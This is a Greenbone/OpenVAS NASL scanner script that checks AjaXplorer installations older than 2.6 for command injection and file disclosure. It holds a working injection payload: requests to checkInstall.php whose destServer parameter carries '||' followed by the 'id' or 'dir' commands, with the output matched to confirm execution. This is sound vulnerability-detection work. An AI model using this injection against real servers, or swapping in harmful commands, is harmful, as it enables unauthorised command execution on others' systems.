# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:ajaxplorer:ajaxplorer";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100574");
  script_version("2022-01-26T06:01:38+0000");
  script_tag(name:"last_modification", value:"2022-01-26 06:01:38 +0000 (Wed, 26 Jan 2022)");
  script_tag(name:"creation_date", value:"2010-04-13 13:16:59 +0200 (Tue, 13 Apr 2010)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("AjaXplorer < 2.6 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ajaxplorer_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ajaxplorer/http/detected");

  script_tag(name:"summary", value:"AjaXplorer is prone to a remote command injection vulnerability
  and a local file disclosure vulnerability because it fails to adequately sanitize user-supplied
  input data.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary commands
  within the context of the affected application and to obtain potentially sensitive information
  from local files on computers running the vulnerable application.");

  script_tag(name:"affected", value:"AjaXplorer prior to version 2.6.");

  script_tag(name:"solution", value:"Update to version 2.6 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39334");
  script_xref(name:"URL", value:"http://www.ajaxplorer.info/wordpress/2010/04/ajaxplorer-2-6-security-ajaxplorer-2-7-1-early-beta-for-3-0/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = make_array("uid=[0-9]+.*gid=[0-9]+", "id",
                  "<dir>", "dir");

foreach cmd (keys(cmds)) {
  url = dir + "/plugins/access.ssh/checkInstall.php?destServer=||" + cmds[cmd];

  if (http_vuln_check(port: port, url: url, pattern: cmd)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
